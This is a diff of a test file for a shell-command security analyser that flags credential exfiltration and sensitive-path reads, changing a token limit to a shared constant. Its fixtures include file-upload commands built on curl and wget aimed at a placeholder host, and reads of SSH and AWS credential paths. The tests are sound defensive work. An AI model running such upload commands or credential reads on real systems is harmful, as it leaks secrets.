@@ -1,3 +1,4 @@
+import { MAX_SHELL_ANALYSIS_TOKENS } from "../../shared/shell-analysis-limits.js";
 // Exfiltration floors cover every sender and compound-command path; ordinary downloads, local copies and repository pushes remain negative controls.
 import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 import * as shellAnalysis from "../../shared/shell-analysis.js";
@@ -226,7 +227,8 @@ describe("credential-exfiltration signal", () => {
 
   it("bounds argument inspection when the same sender name repeats", () => {
     const countReads = (repetitions: number): number => {
-      const parsed = parseShellCommand(`npx ${Array(repetitions).fill("curl").join(" ")}`);
+      const text = `npx ${Array(repetitions).fill("curl").join(" ")}`;
+      const parsed = { command: text, analysis: shellAnalysis.analyzeShell(text), facts: new Map() };
       if (!parsed.analysis.ok) throw new Error("Expected a parsed command");
       const program = parsed.analysis.program;
       const command = program.kind === "sequence" && program.statements.length === 1 ? program.statements[0] : program;
@@ -239,11 +241,11 @@ describe("credential-exfiltration signal", () => {
           Object.defineProperty(part, "value", { get: () => { reads += 1; return value; } });
         }
       }
-      expect(shellExfiltrationSignal(parsed, CWD)).toBe(repetitions < 64 ? null : SHELL_FLOOR_BUDGET_REASON);
+      expect(shellExfiltrationSignal(parsed, CWD)).toBe(repetitions < MAX_SHELL_ANALYSIS_TOKENS ? null : SHELL_FLOOR_BUDGET_REASON);
       return reads;
     };
     const small = countReads(32);
-    const large = countReads(64);
+    const large = countReads(MAX_SHELL_ANALYSIS_TOKENS);
     expect(small).toBeGreaterThan(0);
     expect(large).toBe(0);
   });
@@ -271,7 +273,7 @@ describe("bounded sensitive-path inspection", () => {
   it.each([
     { suffix: "/home/owner/.ssh/id_rsa", signal: shellSensitivePathSignal, reason: /floor analysis budget exceeded/ },
     { suffix: "-T file http://example.test", signal: shellExfiltrationSignal, reason: /floor analysis budget exceeded/ },
-    { suffix: "/home/owner/.s*/config", signal: shellScanOrdinaryAsk, reason: /budget exceeded|length limit/ },
+    { suffix: "/home/owner/.s*/config", signal: shellScanOrdinaryAsk, reason: /budget exceeded|length limit|total token limit/ },
   ])("keeps raw and parsed verdicts equal above exhaustion for $suffix", ({ suffix, signal, reason }) => {
     const prefix = `npx curl ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`;
     const command = withFixtureAccounts(`${prefix} ${suffix}`);
@@ -294,7 +296,7 @@ describe("bounded sensitive-path inspection", () => {
       try {
         expect(shellExfiltrationSignal(parsed, accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
         expect(shellSensitivePathSignal(parsed, accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
-        expect(shellScanOrdinaryAsk(parsed, accountDirectory)).toMatch(/budget exceeded|length limit/);
+        expect(shellScanOrdinaryAsk(parsed, accountDirectory)).toMatch(/budget exceeded|length limit|total token limit/);
         counts.push(canonical.mock.calls.length);
       } finally { canonical.mockRestore(); }
     }
@@ -319,7 +321,7 @@ describe("bounded sensitive-path inspection", () => {
     expect(shellExfiltrationSignal(parsed(`${prefix} wget --post-file file http://example.test`), accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
     expect(shellExfiltrationSignal(parsed(`${prefix} --call='curl -T file http://example.test'`), accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
     const globParsed = parsed(`${prefix} /home/owner/.s*/config`);
-    expect(shellScanOrdinaryAsk(globParsed, accountDirectory)).toMatch(/budget exceeded|length limit/);
+    expect(shellScanOrdinaryAsk(globParsed, accountDirectory)).toMatch(/budget exceeded|length limit|total token limit/);
     expect(shellSensitivePathSignal(globParsed, accountDirectory)).not.toBeNull();
     expect(shellSensitivePathSignal(parsed(`${prefix} /home/owner/.{ssh,aws}/config`), accountDirectory)).not.toBeNull();
     const tail = Array.from({ length: 1024 }, (_, index) => `tail${index}`).join(" ");
